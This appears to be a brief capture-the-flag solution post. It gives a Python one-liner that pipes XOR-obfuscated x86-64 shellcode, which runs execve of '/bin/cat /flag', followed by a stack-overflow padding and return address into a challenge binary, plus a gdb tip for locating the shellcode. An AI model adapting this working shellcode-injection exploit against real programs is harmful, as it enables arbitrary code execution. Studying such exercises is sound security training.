This is the payload that i used

    python -c 'import time, sys; sys.stdout.buffer.write(b"\x6a\x01\xfe\x0c\x24\x48\xb8\x2f\x62\x69\x6e\x2f\x63\x61\x74\x50\x48\x89\xe7\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x01\x2e\x67\x6d\x60\x66\x01\x01\x48\x31\x04\x24\x48\xb8\x2f\x62\x69\x6e\x2f\x63\x61\x74\x50\x31\xf6\x56\x6a\x11\x5e\x48\x01\xe6\x56\x6a\x10\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"); sys.stdout.flush(); time.sleep(2); sys.stdout.buffer.write(b"A"*56 + b"\x00\x00\x87\x15")' | ./your_program

For the Hard one use gdb to find out the mapping of the shell code using `info proc mappings`.
